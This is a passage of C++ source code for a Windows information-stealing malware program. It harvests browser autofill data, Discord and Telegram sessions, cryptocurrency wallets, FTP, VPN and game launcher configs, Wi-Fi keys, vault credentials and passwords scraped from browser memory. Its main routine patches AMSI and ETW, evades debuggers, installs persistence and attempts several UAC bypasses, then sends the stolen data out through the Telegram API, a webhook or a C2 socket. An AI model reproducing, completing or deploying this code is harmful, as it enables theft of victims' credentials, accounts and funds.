            entry["name"] = node["name"];
            write_entry(entry);
        }
        if (node.contains("children") && node["children"].is_array()) {
            for (const auto& child : node["children"]) traverse(child);
        }
    };
    for (auto& [key, root] : data["roots"].items()) traverse(root);
}

void extract_autofill(const fs::path& profile_dir, const std::string& browser_name, const std::string& profile_name) {
    fs::path web_db = profile_dir / "Web Data";
    if (!fs::exists(web_db)) return;
    sqlite3* db = nullptr;
    if (sqlite3_open_v2(web_db.string().c_str(), &db, SQLITE_OPEN_READONLY, NULL) != SQLITE_OK) return;
    const char* query = "SELECT name, value FROM autofill;";
    sqlite3_stmt* stmt = nullptr;
    if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) != SQLITE_OK) { sqlite3_close(db); return; }
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        json entry;
        entry["type"] = "autofill";
        entry["browser"] = browser_name;
        entry["profile"] = profile_name;
        entry["name"] = (const char*)sqlite3_column_text(stmt, 0);
        entry["value"] = (const char*)sqlite3_column_text(stmt, 1);
        write_entry(entry);
    }
    sqlite3_finalize(stmt);
    sqlite3_close(db);
}

void extract_discord_tokens(const fs::path& profile_dir, const std::vector<uint8_t>& master_key,
                            const std::string& browser_name, const std::string& profile_name) {
    fs::path cookie_db = profile_dir / "Network" / "Cookies";
    if (!fs::exists(cookie_db)) cookie_db = profile_dir / "Cookies";
    if (!fs::exists(cookie_db)) return;
    sqlite3* db = nullptr;
    if (sqlite3_open_v2(cookie_db.string().c_str(), &db, SQLITE_OPEN_READONLY, NULL) != SQLITE_OK) return;
    const char* query = "SELECT encrypted_value FROM cookies WHERE host_key LIKE '%discord.com%' AND name = 'token';";
    sqlite3_stmt* stmt = nullptr;
    if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) != SQLITE_OK) { sqlite3_close(db); return; }
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        std::vector<uint8_t> encrypted_blob((uint8_t*)sqlite3_column_blob(stmt, 0), (uint8_t*)sqlite3_column_blob(stmt, 0) + sqlite3_column_bytes(stmt, 0));
        if (encrypted_blob.empty()) continue;
        auto decrypted = decrypt_blob(master_key, encrypted_blob);
        if (!decrypted) continue;
        json entry;
        entry["type"] = "discord_token";
        entry["browser"] = browser_name;
        entry["profile"] = profile_name;
        entry["token"] = *decrypted;
        write_entry(entry);
    }
    sqlite3_finalize(stmt);
    sqlite3_close(db);
}

void extract_discord_tokens_leveldb() {
    fs::path local_appdata = _wgetenv(L"LOCALAPPDATA");
    fs::path discord_path = local_appdata / L"Discord";
    if (!fs::exists(discord_path)) return;
    for (auto& version : fs::directory_iterator(discord_path)) {
        if (version.is_directory() && version.path().filename().string().find("app-") != std::string::npos) {
            fs::path leveldb = version.path() / "Local Storage" / "leveldb";
            if (!fs::exists(leveldb)) continue;
            for (auto& file : fs::directory_iterator(leveldb)) {
                if (file.path().extension() == ".log" || file.path().filename().string().find(".ldb") != std::string::npos) {
                    std::ifstream f(file.path(), std::ios::binary);
                    if (!f.is_open()) continue;
                    std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
                    std::regex token_regex(R"([a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27})");
                    std::smatch match;
                    auto start = content.cbegin();
                    while (std::regex_search(start, content.cend(), match, token_regex)) {
                        json entry;
                        entry["type"] = "discord_token_leveldb";
                        entry["token"] = match.str();
                        write_entry(entry);
                        start = match.suffix().first;
                    }
                }
            }
        }
    }
}

void extract_telegram_session() {
    fs::path appdata = _wgetenv(L"APPDATA");
    fs::path tdata = appdata / L"Telegram Desktop" / L"tdata";
    if (!fs::exists(tdata)) return;
    for (auto& entry : fs::directory_iterator(tdata)) {
        if (entry.path().filename().string().find("D877F783D5D3EF8C") != std::string::npos ||
            entry.path().filename().string().find("map") != std::string::npos) {
            fs::copy(entry.path(), fs::path(g_config.output_dir) / entry.path().filename(), fs::copy_options::overwrite_existing);
        }
    }
}

void extract_crypto_wallets() {
    fs::path appdata = _wgetenv(L"APPDATA");
    fs::path localappdata = _wgetenv(L"LOCALAPPDATA");
    std::vector<std::pair<fs::path, std::string>> wallets = {
        {appdata / L"Exodus" / L"exodus.wallet", "Exodus"},
        {appdata / L"Electrum" / L"wallets" / L"default_wallet", "Electrum"},
        {appdata / L"Atomic" / L"AtomicWallet" / L"wallet.dat", "Atomic"},
        {appdata / L"Guarda" / L"Guarda" / L"wallet.dat", "Guarda"},
        {appdata / L"Coinomi" / L"Coinomi" / L"wallet.dat", "Coinomi"},
        {localappdata / L"Binance" / L"Binance" / L"wallet.dat", "Binance"},
        {appdata / L"MetaMask" / L"Local Storage" / L"leveldb", "MetaMask"},
        {appdata / L"Trust Wallet" / L"Trust Wallet" / L"wallet.dat", "Trust"},
        {appdata / L"Phantom" / L"Phantom" / L"wallet.dat", "Phantom"},
        {appdata / L"Ethereum" / L"keystore", "Ethereum"},
        {appdata / L"Dogecoin" / L"wallet.dat", "Dogecoin"},
        {appdata / L"Bitcoin" / L"wallet.dat", "Bitcoin"},
        {appdata / L"Litecoin" / L"wallet.dat", "Litecoin"},
        {appdata / L"Monero" / L"wallet", "Monero"},
        {appdata / L"Zcash" / L"wallet.dat", "Zcash"},
    };
    for (auto& [path, name] : wallets) {
        if (fs::exists(path)) {
            json entry;
            entry["type"] = "crypto_wallet";
            entry["name"] = name;
            entry["path"] = path.string();
            write_entry(entry);
            try {
                fs::copy(path, fs::path(g_config.output_dir) / (name + ".dat"), fs::copy_options::recursive | fs::copy_options::overwrite_existing);
            } catch (...) {}
        }
    }
}

void extract_filezilla() {
    fs::path appdata = _wgetenv(L"APPDATA");
    fs::path filezilla = appdata / L"FileZilla" / L"sitemanager.xml";
    if (fs::exists(filezilla)) {
        json entry;
        entry["type"] = "filezilla";
        entry["path"] = filezilla.string();
        write_entry(entry);
        fs::copy(filezilla, fs::path(g_config.output_dir) / "sitemanager.xml", fs::copy_options::overwrite_existing);
    }
}

void extract_winscp() {
    fs::path appdata = _wgetenv(L"APPDATA");
    fs::path winscp = appdata / L"WinSCP.ini";
    if (fs::exists(winscp)) {
        json entry;
        entry["type"] = "winscp";
        entry["path"] = winscp.string();
        write_entry(entry);
        fs::copy(winscp, fs::path(g_config.output_dir) / "WinSCP.ini", fs::copy_options::overwrite_existing);
    }
}

void extract_outlook() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        wchar_t profileName[256];
        DWORD size = sizeof(profileName);
        for (int i = 0; RegEnumKeyExW(hKey, i, profileName, &size, NULL, NULL, NULL, NULL) == ERROR_SUCCESS; i++, size = sizeof(profileName)) {
            json entry;
            entry["type"] = "outlook_profile";
            entry["name"] = wstr_to_utf8(profileName);
            write_entry(entry);
        }
        RegCloseKey(hKey);
    }
    HKEY hKey2;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles", 0, KEY_READ, &hKey2) == ERROR_SUCCESS) {
        wchar_t profileName[256];
        DWORD size = sizeof(profileName);
        for (int i = 0; RegEnumKeyExW(hKey2, i, profileName, &size, NULL, NULL, NULL, NULL) == ERROR_SUCCESS; i++, size = sizeof(profileName)) {
            json entry;
            entry["type"] = "outlook_profile_old";
            entry["name"] = wstr_to_utf8(profileName);
            write_entry(entry);
        }
        RegCloseKey(hKey2);
    }
}

void extract_wifi() {
    HANDLE wlanHandle = nullptr;
    DWORD negotiatedVersion;
    if (WlanOpenHandle(2, NULL, &negotiatedVersion, &wlanHandle) != ERROR_SUCCESS) return;
    PWLAN_INTERFACE_INFO_LIST ifaceList = nullptr;
    if (WlanEnumInterfaces(wlanHandle, NULL, &ifaceList) != ERROR_SUCCESS) { WlanCloseHandle(wlanHandle, NULL); return; }
    for (DWORD i = 0; i < ifaceList->dwNumberOfItems; i++) {
        PWLAN_PROFILE_INFO_LIST profileList = nullptr;
        if (WlanGetProfileList(wlanHandle, &ifaceList->InterfaceInfo[i].InterfaceGuid, NULL, &profileList) == ERROR_SUCCESS) {
            for (DWORD j = 0; j < profileList->dwNumberOfItems; j++) {
                wchar_t* xmlData = nullptr;
                DWORD flags = 0;
                if (WlanGetProfile(wlanHandle, &ifaceList->InterfaceInfo[i].InterfaceGuid, profileList->ProfileInfo[j].strProfileName, NULL, &xmlData, &flags, NULL) == ERROR_SUCCESS) {
                    if (xmlData) {
                        std::wstring xml(xmlData);
                        std::wstring key = L"<keyMaterial>";
                        size_t pos = xml.find(key);
                        if (pos != std::wstring::npos) {
                            size_t end = xml.find(L"</keyMaterial>", pos);
                            if (end != std::wstring::npos) {
                                std::wstring pass = xml.substr(pos + key.length(), end - pos - key.length());
                                json entry;
                                entry["type"] = "wifi";
                                entry["ssid"] = wstr_to_utf8(profileList->ProfileInfo[j].strProfileName);
                                entry["password"] = wstr_to_utf8(pass);
                                write_entry(entry);
                            }
                        }
                        WlanFreeMemory(xmlData);
                    }
                }
            }
            WlanFreeMemory(profileList);
        }
    }
    WlanFreeMemory(ifaceList);
    WlanCloseHandle(wlanHandle, NULL);
}

void extract_vpn() {
    fs::path appdata = _wgetenv(L"APPDATA");
    fs::path localappdata = _wgetenv(L"LOCALAPPDATA");
    std::vector<fs::path> vpn_paths = {
        appdata / L"NordVPN" / L"NordVPN" / L"config",
        appdata / L"ExpressVPN" / L"config",
        localappdata / L"ProtonVPN" / L"config",
        appdata / L"OpenVPN Connect" / L"profiles",
    };
    for (auto& path : vpn_paths) {
        if (fs::exists(path)) {
            json entry;
            entry["type"] = "vpn";
            entry["path"] = path.string();
            write_entry(entry);
            try { fs::copy(path, fs::path(g_config.output_dir) / path.filename(), fs::copy_options::recursive | fs::copy_options::overwrite_existing); } catch (...) {}
        }
    }
}

void extract_steam() {
    fs::path steam = fs::path(_wgetenv(L"ProgramFiles(x86)")) / L"Steam" / L"config" / L"loginusers.vdf";
    if (fs::exists(steam)) {
        json entry;
        entry["type"] = "steam";
        entry["path"] = steam.string();
        write_entry(entry);
        fs::copy(steam, fs::path(g_config.output_dir) / "steam_loginusers.vdf", fs::copy_options::overwrite_existing);
    }
}

void extract_uplay() {
    fs::path localappdata = _wgetenv(L"LOCALAPPDATA");
    fs::path uplay = localappdata / L"Ubisoft Game Launcher" / L"settings.ini";
    if (fs::exists(uplay)) {
        json entry;
        entry["type"] = "uplay";
        entry["path"] = uplay.string();
        write_entry(entry);
        fs::copy(uplay, fs::path(g_config.output_dir) / "uplay.ini", fs::copy_options::overwrite_existing);
    }
}

void extract_epic() {
    fs::path localappdata = _wgetenv(L"LOCALAPPDATA");
    fs::path epic = localappdata / L"EpicGamesLauncher" / L"Saved" / L"Config" / L"Windows" / L"GameUserSettings.ini";
    if (fs::exists(epic)) {
        json entry;
        entry["type"] = "epic";
        entry["path"] = epic.string();
        write_entry(entry);
        fs::copy(epic, fs::path(g_config.output_dir) / "epic.ini", fs::copy_options::overwrite_existing);
    }
}

void extract_credentials_vault() {
    DWORD count = 0;
    PCREDENTIALW* creds = nullptr;
    if (CredEnumerateW(NULL, 0, &count, &creds)) {
        for (DWORD i = 0; i < count; i++) {
            json entry;
            entry["type"] = "credential_vault";
            entry["target"] = wstr_to_utf8(creds[i]->TargetName);
            entry["username"] = wstr_to_utf8(creds[i]->UserName ? creds[i]->UserName : L"");
            if (creds[i]->CredentialBlobSize > 0) {
                std::string blob((char*)creds[i]->CredentialBlob, creds[i]->CredentialBlobSize);
                entry["password"] = blob;
            }
            write_entry(entry);
        }
        CredFree(creds);
    }
}

void extract_passwords_from_memory(const std::wstring& process_name) {
    DWORD processes[1024], cbNeeded;
    if (!EnumProcesses(processes, sizeof(processes), &cbNeeded)) return;
    DWORD numProcesses = cbNeeded / sizeof(DWORD);
    for (DWORD i = 0; i < numProcesses; i++) {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processes[i]);
        if (hProcess) {
            wchar_t szProcessName[MAX_PATH] = L"<unknown>";
            HMODULE hMod;
            DWORD cbNeededMod;
            if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeededMod)) {
                GetModuleBaseNameW(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(wchar_t));
            }
            if (_wcsicmp(szProcessName, process_name.c_str()) == 0) {
                SYSTEM_INFO sysInfo;
                GetSystemInfo(&sysInfo);
                MEMORY_BASIC_INFORMATION memInfo;
                BYTE* pAddress = (BYTE*)sysInfo.lpMinimumApplicationAddress;
                while (pAddress < sysInfo.lpMaximumApplicationAddress) {
                    if (VirtualQueryEx(hProcess, pAddress, &memInfo, sizeof(memInfo)) == 0) break;
                    if (memInfo.State == MEM_COMMIT && (memInfo.Protect & PAGE_READWRITE)) {
                        std::vector<BYTE> buffer(memInfo.RegionSize);
                        SIZE_T bytesRead;
                        if (ReadProcessMemory(hProcess, pAddress, buffer.data(), memInfo.RegionSize, &bytesRead)) {
                            std::string region((char*)buffer.data(), bytesRead);
                            std::regex pass_regex(R"("password"\s*:\s*"([^"]+)")", std::regex::icase);
                            std::smatch match;
                            auto start = region.cbegin();
                            while (std::regex_search(start, region.cend(), match, pass_regex)) {
                                json entry;
                                entry["type"] = "memory_password";
                                entry["process"] = wstr_to_utf8(process_name);
                                entry["value"] = match[1].str();
                                write_entry(entry);
                                start = match.suffix().first;
                            }
                            std::regex token_regex(R"([a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27})");
                            start = region.cbegin();
                            while (std::regex_search(start, region.cend(), match, token_regex)) {
                                json entry;
                                entry["type"] = "memory_token";
                                entry["process"] = wstr_to_utf8(process_name);
                                entry["token"] = match.str();
                                write_entry(entry);
                                start = match.suffix().first;
                            }
                        }
                    }
                    pAddress += memInfo.RegionSize;
                }
                NtClose_wrapper(hProcess);
                break;
            }
            NtClose_wrapper(hProcess);
        }
    }
}

void steal_browser_memory() {
    std::vector<std::wstring> browsers = {L"msedge.exe", L"chrome.exe", L"brave.exe", L"opera.exe", L"firefox.exe"};
    for (const auto& browser : browsers) extract_passwords_from_memory(browser);
}

bool winhttp_upload_file(const std::wstring& server, const std::wstring& path, const std::wstring& file_path) {
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return false;
    HINTERNET hConnect = WinHttpConnect(hSession, server.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path.c_str(), NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    std::wstring boundary = L"---------------------------" + std::to_wstring(GetTickCount64());
    std::wstring header = L"Content-Type: multipart/form-data; boundary=" + boundary;
    WinHttpAddRequestHeaders(hRequest, header.c_str(), (DWORD)header.length(), WINHTTP_ADDREQ_FLAG_ADD);
    std::ifstream file(file_path, std::ios::binary);
    if (!file.is_open()) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    file.seekg(0, std::ios::end);
    size_t size = file.tellg();
    file.seekg(0, std::ios::beg);
    std::vector<char> fileData(size);
    file.read(fileData.data(), size);
    file.close();
    std::wstring bodyStart = L"--" + boundary + L"\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + file_path.substr(file_path.find_last_of(L'\\') + 1) + L"\"\r\nContent-Type: application/octet-stream\r\n\r\n";
    std::string bodyStartA = wstr_to_utf8(bodyStart);
    std::wstring bodyEnd = L"\r\n--" + boundary + L"--\r\n";
    std::string bodyEndA = wstr_to_utf8(bodyEnd);
    std::vector<char> postData;
    postData.insert(postData.end(), bodyStartA.begin(), bodyStartA.end());
    postData.insert(postData.end(), fileData.begin(), fileData.end());
    postData.insert(postData.end(), bodyEndA.begin(), bodyEndA.end());
    if (!WinHttpSendRequest(hRequest, NULL, 0, (LPVOID)postData.data(), (DWORD)postData.size(), (DWORD)postData.size(), 0)) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false;
    }
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false;
    }
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    return true;
}

bool send_to_telegram(const std::wstring& file_path) {
    std::wstring bot_token = utf8_to_wstr(g_config.telegram_bot_token);
    std::wstring chat_id = utf8_to_wstr(g_config.telegram_chat_id);
    std::wstring url = L"/bot" + bot_token + L"/sendDocument";
    return winhttp_upload_file(L"api.telegram.org", url, file_path);
}

bool send_to_webhook(const std::wstring& file_path) {
    std::wstring url = utf8_to_wstr(g_config.webhook_url);
    size_t pos = url.find(L"://");
    if (pos == std::wstring::npos) return false;
    std::wstring protocol = url.substr(0, pos);
    url = url.substr(pos + 3);
    std::wstring server, path;
    pos = url.find(L'/');
    if (pos != std::wstring::npos) {
        server = url.substr(0, pos);
        path = url.substr(pos);
    } else {
        server = url;
        path = L"/";
    }
    return winhttp_upload_file(server, path, file_path);
}

bool send_to_c2(const std::wstring& file_path) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return false;
    struct addrinfo hints, *res;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    if (getaddrinfo(g_config.c2_host.c_str(), std::to_string(g_config.c2_port).c_str(), &hints, &res) != 0) { WSACleanup(); return false; }
    SOCKET sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (sock == INVALID_SOCKET) { freeaddrinfo(res); WSACleanup(); return false; }
    if (connect(sock, res->ai_addr, (int)res->ai_addrlen) == SOCKET_ERROR) { closesocket(sock); freeaddrinfo(res); WSACleanup(); return false; }
    freeaddrinfo(res);
    std::ifstream file(file_path, std::ios::binary);
    if (!file.is_open()) { closesocket(sock); WSACleanup(); return false; }
    file.seekg(0, std::ios::end);
    size_t size = file.tellg();
    file.seekg(0, std::ios::beg);
    std::vector<char> buffer(size);
    file.read(buffer.data(), size);
    file.close();
    send(sock, buffer.data(), (int)size, 0);
    char recvBuf[1024];
    int received = recv(sock, recvBuf, sizeof(recvBuf) - 1, 0);
    bool success = (received > 0);
    closesocket(sock);
    WSACleanup();
    return success;
}

void exfiltrate_data() {
    if (!g_config.exfiltrate) return;
    fs::path output_file = fs::path(g_config.output_dir) / "stealer_output.json";
    if (!fs::exists(output_file)) return;
    int retries = 5;
    bool sent = false;
    while (retries-- > 0 && !sent) {
        if (!g_config.telegram_bot_token.empty() && !g_config.telegram_chat_id.empty()) {
            if (send_to_telegram(output_file.wstring())) { sent = true; break; }
        }
        if (!g_config.webhook_url.empty()) {
            if (send_to_webhook(output_file.wstring())) { sent = true; break; }
        }
        if (!g_config.c2_host.empty() && g_config.c2_port > 0) {
            if (send_to_c2(output_file.wstring())) { sent = true; break; }
        }
        Sleep(5000);
    }
}

std::map<std::string, std::vector<fs::path>> get_browser_paths() {
    std::map<std::string, std::vector<fs::path>> browsers;
    fs::path local = _wgetenv(L"LOCALAPPDATA");
    fs::path roaming = _wgetenv(L"APPDATA");
    auto add = [&](const std::string& name, const fs::path& path) {
        if (fs::exists(path) && fs::is_directory(path)) browsers[name].push_back(path);
    };
    add("Chrome", local / "Google" / "Chrome" / "User Data");
    add("Edge", local / "Microsoft" / "Edge" / "User Data");
    add("Brave", local / "BraveSoftware" / "Brave-Browser" / "User Data");
    add("Opera", roaming / "Opera Software" / "Opera Stable");
    add("Vivaldi", local / "Vivaldi" / "User Data");
    add("Chromium", local / "Chromium" / "User Data");
    add("Firefox", roaming / "Mozilla" / "Firefox" / "Profiles");
    add("Opera GX", roaming / "Opera Software" / "Opera GX Stable");
    add("Comodo Dragon", local / "Comodo" / "Dragon" / "User Data");
    add("360 Browser", local / "360Chrome" / "Chrome" / "User Data");
    add("Yandex", local / "Yandex" / "YandexBrowser" / "User Data");
    add("CocCoc", local / "CocCoc" / "Browser" / "User Data");
    return browsers;
}

class ThreadPool {
public:
    ThreadPool(size_t threads) : stop(false) {
        if (threads == 0) threads = std::thread::hardware_concurrency();
        for (size_t i = 0; i < threads; ++i) {
            workers.emplace_back([this] {
                while (true) {
                    std::function<void()> task;
                    {
                        std::unique_lock<std::mutex> lock(this->queue_mutex);
                        this->condition.wait(lock, [this] { return this->stop || !this->tasks.empty(); });
                        if (this->stop && this->tasks.empty()) return;
                        task = std::move(this->tasks.front());
                        this->tasks.pop();
                    }
                    task();
                }
            });
        }
    }
    template<class F> void enqueue(F&& f) {
        { std::unique_lock<std::mutex> lock(queue_mutex); tasks.emplace(std::forward<F>(f)); }
        condition.notify_one();
    }
    ~ThreadPool() {
        { std::unique_lock<std::mutex> lock(queue_mutex); stop = true; }
        condition.notify_all();
        for (std::thread& worker : workers) worker.join();
    }
private:
    std::vector<std::thread> workers;
    std::queue<std::function<void()>> tasks;
    std::mutex queue_mutex;
    std::condition_variable condition;
    bool stop;
};

json get_system_fingerprint() {
    json fp;
    char hostname[256]; DWORD size = sizeof(hostname);
    GetComputerNameA(hostname, &size);
    fp["hostname"] = hostname;
    fp["username"] = _wgetenv(L"USERNAME") ? wstr_to_utf8(_wgetenv(L"USERNAME")) : "unknown";
    fp["os"] = "Windows";
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        wchar_t build[64]; DWORD buildSize = sizeof(build);
        if (RegQueryValueExW(hKey, L"CurrentBuild", NULL, NULL, (LPBYTE)build, &buildSize) == ERROR_SUCCESS) fp["build"] = wstr_to_utf8(build);
        wchar_t edition[64]; DWORD editionSize = sizeof(edition);
        if (RegQueryValueExW(hKey, L"EditionID", NULL, NULL, (LPBYTE)edition, &editionSize) == ERROR_SUCCESS) fp["edition"] = wstr_to_utf8(edition);
        RegCloseKey(hKey);
    }
    SYSTEM_INFO sys; GetSystemInfo(&sys);
    fp["cpu_cores"] = sys.dwNumberOfProcessors;
    MEMORYSTATUSEX mem; mem.dwLength = sizeof(mem); GlobalMemoryStatusEx(&mem);
    fp["ram_gb"] = mem.ullTotalPhys / (1024ULL * 1024 * 1024);
    return fp;
}

void process_browser(ThreadPool& pool, const std::string& browser_name, const std::vector<fs::path>& dirs, const std::string& filter_profile) {
    for (const auto& dir : dirs) {
        if (browser_name == "Firefox") {
            for (auto& profile : fs::directory_iterator(dir)) {
                if (profile.is_directory()) {
                    pool.enqueue([p = profile.path()] { extract_firefox_data(p); });
                }
            }
            continue;
        }
        fs::path local_state = dir / "Local State";
        if (!fs::exists(local_state)) continue;
        auto master_key = get_master_key(local_state, browser_name);
        if (!master_key) continue;
        auto profiles = find_profiles(dir);
        for (const auto& profile : profiles) {
            std::string profile_name = profile.filename().string();
            if (!filter_profile.empty() && profile_name != filter_profile) continue;
            std::vector<uint8_t> mk = *master_key;
            pool.enqueue([=]() {
                extract_passwords(profile, mk, browser_name, profile_name);
                extract_cookies(profile, mk, browser_name, profile_name);
                extract_credit_cards(profile, mk, browser_name, profile_name);
                extract_history(profile, browser_name, profile_name);
                extract_bookmarks(profile, browser_name, profile_name);
                extract_autofill(profile, browser_name, profile_name);
                extract_discord_tokens(profile, mk, browser_name, profile_name);
            });
        }
    }
}

int main(int argc, char* argv[]) {
    OPENSSL_init_crypto(OPENSSL_INIT_ADD_ALL_CIPHERS | OPENSSL_INIT_ADD_ALL_DIGESTS, nullptr);
    g_ntdll = GetModuleHandleA(OBF_NTDLL.c_str());
    unhook_ntdll();
    patch_etw();
    patch_amsi();
    hide_thread_from_debugger();
    RAND_bytes(g_encryption_key.data(), 32);
    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "--telegram-token" && i + 1 < argc) g_config.telegram_bot_token = argv[++i];
        else if (arg == "--telegram-chat" && i + 1 < argc) g_config.telegram_chat_id = argv[++i];
        else if (arg == "--webhook" && i + 1 < argc) g_config.webhook_url = argv[++i];
        else if (arg == "--c2-host" && i + 1 < argc) g_config.c2_host = argv[++i];
        else if (arg == "--c2-port" && i + 1 < argc) g_config.c2_port = std::stoi(argv[++i]);
        else if (arg == "--no-exfil") g_config.exfiltrate = false;
        else if (arg == "--no-compress") g_config.compress = false;
        else if (arg == "--no-silent") g_config.silent = false;
        else if (arg == "--no-antidebug") g_config.anti_debug = false;
        else if (arg == "--no-persistence") g_config.persistence = false;
        else if (arg == "--threads" && i + 1 < argc) g_config.max_threads = std::stoi(argv[++i]);
        else if (arg == "--output-dir" && i + 1 < argc) g_config.output_dir = argv[++i];
        else if (arg == "--browser" && i + 1 < argc) g_config.browsers_filter.push_back(argv[++i]);
    }
    if (g_config.anti_debug) {
        std::thread(anti_debug_loop).detach();
    }
    if (g_config.persistence) {
        install_persistence();
    }
    uac_bypass_fodhelper();
    uac_bypass_eventvwr();
    uac_bypass_cmstp();
    elevate_to_system();
    json fp = get_system_fingerprint();
    g_global_json["fingerprint"] = fp;
    fs::create_directories(g_config.output_dir);
    fs::path output_file_path = fs::path(g_config.output_dir) / "stealer_output.json";
    g_output_file.open(output_file_path, std::ios::out | std::ios::trunc);
    if (g_output_file.is_open()) g_output_file << "[\n";
    auto all_browsers = get_browser_paths();
    std::map<std::string, std::vector<fs::path>> filtered_browsers;
    if (!g_config.browsers_filter.empty()) {
        for (const auto& name : g_config.browsers_filter) {
            if (all_browsers.find(name) != all_browsers.end()) filtered_browsers[name] = all_browsers[name];
        }
    } else filtered_browsers = all_browsers;
    {
        ThreadPool pool(g_config.max_threads);
        for (const auto& [name, dirs] : filtered_browsers) process_browser(pool, name, dirs, "");
    }
    extract_discord_tokens_leveldb();
    extract_telegram_session();
    extract_crypto_wallets();
    extract_filezilla();
    extract_winscp();
    extract_outlook();
    extract_wifi();
    extract_vpn();
    extract_steam();
    extract_uplay();
    extract_epic();
    extract_credentials_vault();
    steal_browser_memory();
    if (g_output_file.is_open()) {
        if (g_output_count > 0) g_output_file.seekp(-1, std::ios::end);
        g_output_file << "\n]\n";
        g_output_file.close();
    }
    fs::path full_json = fs::path(g_config.output_dir) / "full_data.json";
    std::ofstream full(full_json);
    if (full.is_open()) {
        std::string full_str = g_global_json.dump(4);
        if (g_config.compress) {
            std::vector<uint8_t> data(full_str.begin(), full_str.end());
            auto encrypted = aes_gcm_encrypt(g_encryption_key, data);
            full << base64_encode(encrypted);
        } else full << full_str;
        full.close();
    }
    exfiltrate_data();
    return 0;
}